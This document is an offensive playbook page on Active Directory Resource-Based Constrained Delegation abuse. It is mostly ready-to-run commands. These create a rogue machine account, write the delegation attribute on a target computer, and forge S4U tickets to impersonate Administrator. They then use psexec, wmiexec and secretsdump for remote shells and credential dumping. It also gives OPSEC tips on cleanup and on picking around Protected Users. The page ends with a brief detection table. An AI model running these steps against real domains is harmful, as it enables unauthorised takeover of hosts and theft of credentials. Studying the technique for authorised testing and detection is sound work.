---
title: "Attack #17 — Resource-Based Constrained Delegation (RBCD)"
description: "Resource-Based Constrained Delegation (RBCD) flips traditional Constrained Delegation on its head. Instead of the delegating account specifying which…"
category: active-directory
tags: ["active-directory", "delegation"]
tools: ["NetExec", "Impacket", "Rubeus", "BloodHound", "ldapsearch"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Two/🟠 Attack #17 — Resource-Based Constrained Delegation (RBCD).md"
---
# 🟠 Attack #17 — Resource-Based Constrained Delegation (RBCD)

***

## 📖 How It Works

Resource-Based Constrained Delegation (RBCD) flips traditional Constrained Delegation on its head. Instead of the **delegating account** specifying which services it can delegate to (via `msDS-AllowedToDelegateTo`), the **target resource** specifies which accounts are allowed to delegate to it (via `msDS-AllowedToActOnBehalfOfOtherIdentity`). This means anyone who can **write to a computer object's attributes** can configure RBCD on it — allowing a controlled account to impersonate any user to that computer.

### Why RBCD is So Dangerous

1. **No Domain Admin required to configure** — only GenericWrite/GenericAll on the target computer
2. **MachineAccountQuota** allows any domain user to create up to 10 computer accounts by default
3. **Combining write permissions + machine account creation = full compromise of the target host**

### The Full Attack Flow

```
1. Identify a computer object where you have write permissions (GenericWrite/GenericAll)
2. Create a machine account you control (or use an existing one)
3. Set msDS-AllowedToActOnBehalfOfOtherIdentity on the TARGET computer
   to trust your machine account
4. Use S4U2Self + S4U2Proxy from your machine account to impersonate
   Administrator to the target computer
5. Access the target as Administrator (CIFS, HOST, LDAP, etc.)
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Write permissions on target computer** | GenericWrite, GenericAll, WriteDACL, or specific write to `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| **Controlled machine account** | Create via MachineAccountQuota (default 10) or use existing compromised computer |
| **Domain user account** | To create machine account and configure RBCD |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Impacket — rbcd.py** | Linux | Configure RBCD delegation |
| **Impacket — addcomputer.py** | Linux | Create machine accounts |
| **Impacket — getST.py** | Linux | S4U2Self + S4U2Proxy exploitation |
| **Rubeus** | Windows | S4U attack after RBCD configuration |
| **PowerView** | Windows | Write RBCD attribute on target |
| **StandIn** | Windows | .NET tool for RBCD manipulation |
| **bloodyAD** | Linux | All-in-one RBCD exploitation |

***

## 💻 Full Commands

### 🔵 Step 1 — Find Writable Computer Objects

```powershell
# ── PowerView — find computers where you have write access ────────────────────
Find-InterestingDomainAcl -ResolveGUIDs | 
  Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDACL" -and 
    $_.ObjectClass -eq "computer" }

# ── BloodHound Cypher query ───────────────────────────────────────────────────
# MATCH p=(u:User {name:'LOW_USER@CORP.LOCAL'})-[r:GenericWrite|GenericAll]->(c:Computer) RETURN p
```

```bash
# ── BloodHound.py — collect and analyze ───────────────────────────────────────
bloodhound-python -u low_user -p 'Password1' -d corp.local -ns 10.10.10.10 -c All --zip
# Upload to BloodHound → "Find Shortest Paths to Domain Admins"
```

### 🔴 Step 2 — Create Machine Account

```bash
# ── Impacket — create machine account ─────────────────────────────────────────
addcomputer.py -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!' \
  -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

# ── Check MachineAccountQuota (default = 10) ──────────────────────────────────
nxc ldap DC01.corp.local -u low_user -p 'Password1' -M maq
# Or:
ldapsearch -x -H ldap://DC01.corp.local -D "low_user@corp.local" -w 'Password1' \
  -b "DC=corp,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota
```

```powershell
# ── PowerShell — create machine account ───────────────────────────────────────
Import-Module .\\Powermad.ps1
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(
  ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force
)
```

### 🔴 Step 3 — Configure RBCD on Target

```bash
# ── Impacket — rbcd.py ────────────────────────────────────────────────────────
rbcd.py -delegate-from 'FAKEMACHINE$' -delegate-to 'TARGET$' \
  -action write -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

# ── Verify ────────────────────────────────────────────────────────────────────
rbcd.py -delegate-to 'TARGET$' -action read \
  -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

# ── bloodyAD ──────────────────────────────────────────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  add rbcd 'TARGET$' 'FAKEMACHINE$'
```

```powershell
# ── PowerShell / PowerView ────────────────────────────────────────────────────
$ComputerSid = Get-DomainComputer FAKEMACHINE -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# ── StandIn ───────────────────────────────────────────────────────────────────
.\StandIn.exe --computer TARGET --sid <FAKEMACHINE_SID>
```

### 🔴 Step 4 — S4U Attack → Impersonate Administrator

```bash
# ── getST.py — S4U2Self + S4U2Proxy ──────────────────────────────────────────
getST.py -spn cifs/TARGET.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  corp.local/'FAKEMACHINE$':'FakePass123!'

# ── Use the ticket ────────────────────────────────────────────────────────────
export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache

psexec.py -k -no-pass corp.local/Administrator@TARGET.corp.local
wmiexec.py -k -no-pass corp.local/Administrator@TARGET.corp.local
secretsdump.py -k -no-pass corp.local/Administrator@TARGET.corp.local
smbclient.py -k -no-pass corp.local/Administrator@TARGET.corp.local
```

```powershell
# ── Rubeus S4U ────────────────────────────────────────────────────────────────
# First get FAKEMACHINE's hash:
.\Rubeus.exe hash /password:FakePass123! /user:FAKEMACHINE$ /domain:corp.local
# rc4_hmac: <hash>

.\Rubeus.exe s4u \
  /user:FAKEMACHINE$ \
  /rc4:<FAKEMACHINE_HASH> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.corp.local \
  /ptt

dir \\TARGET.corp.local\C$
```

### 🔴 Step 5 — Cleanup

```bash
# ── Remove RBCD configuration ────────────────────────────────────────────────
rbcd.py -delegate-to 'TARGET$' -action flush \
  -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

# ── Delete machine account (if desired) ───────────────────────────────────────
addcomputer.py -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!' \
  -dc-ip 10.10.10.10 corp.local/low_user:'Password1' -delete
```

***

## 🎯 OPSEC Tips

- **RBCD is the most commonly exploited delegation type** — no DA required, just GenericWrite on a computer
- **MachineAccountQuota = 10 by default** — almost always available for machine account creation
- **Cleanup is critical** — remove the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute and delete the machine account after exploitation
- **Protected Users group blocks delegation** — if Administrator is in Protected Users, impersonation will fail; target a different DA

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **5136** | Security Log (DC) | Modification of `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| **4741** | Security Log (DC) | Computer account creation (MachineAccountQuota abuse) |
| **4769** | Security Log (DC) | S4U2Proxy TGS request |
| **4624** | Security Log | Network logon as impersonated user on target |

***

## 🔗 Attack Chain Context

```
[RBCD] ──→ Compromise Any Computer You Can Write To
         │
         ├──→ 🔑 GenericWrite on Computer → RBCD → impersonate DA → own that host
         ├──→ 💻 GenericAll (#19) → RBCD is one of the exploitation methods
         ├──→ 🏭 MAQ (#47) → create controlled machine accounts for RBCD
         ├──→ 🔗 Chain: ACL abuse → RBCD → DCSync (if target is DC)
         └──→ 💀 Defeated by: set MAQ=0, monitor 5136, Protected Users group
```

***

> ✅ **Attack #17 — RBCD complete.**
